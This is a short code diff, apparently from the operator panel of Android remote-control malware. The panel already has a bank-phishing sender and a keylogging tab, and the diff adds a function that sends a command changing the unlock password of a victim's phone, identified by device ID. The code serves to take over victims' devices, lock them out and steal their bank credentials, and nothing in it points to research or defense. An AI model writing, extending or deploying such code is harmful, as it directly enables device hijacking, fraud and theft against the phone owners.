@@ -493,6 +493,19 @@ const handleSendBankPhish = (bank: string) => {
     message.success(`${bankNames[bank] || bank} 钓鱼请求已发送`);
 };
 
+// 修改解锁密码
+const handleModifyPassword = (password: string) => {
+    send({ 
+        itype: 'slr_panel', 
+        subc: 'screen', 
+        pid: deviceId.value, 
+        comand: 'phonepass',
+        passtype: '1',
+        txt: password
+    });
+    message.success('修改密码请求已发送');
+};
+
 // 黑屏文字状态
 const blockTextActive = ref(false);
 
@@ -1001,6 +1014,7 @@ const tabList = [
                                     @toggle-block-text="handleToggleBlockText"
                                     @paste="handlePaste"
                                     @open-quick-app="handleOpenQuickApp"
+                                    @modify-password="handleModifyPassword"
                                 />
                                 <KeylogTab
                                     v-else-if="activeTab === 'keylog'"
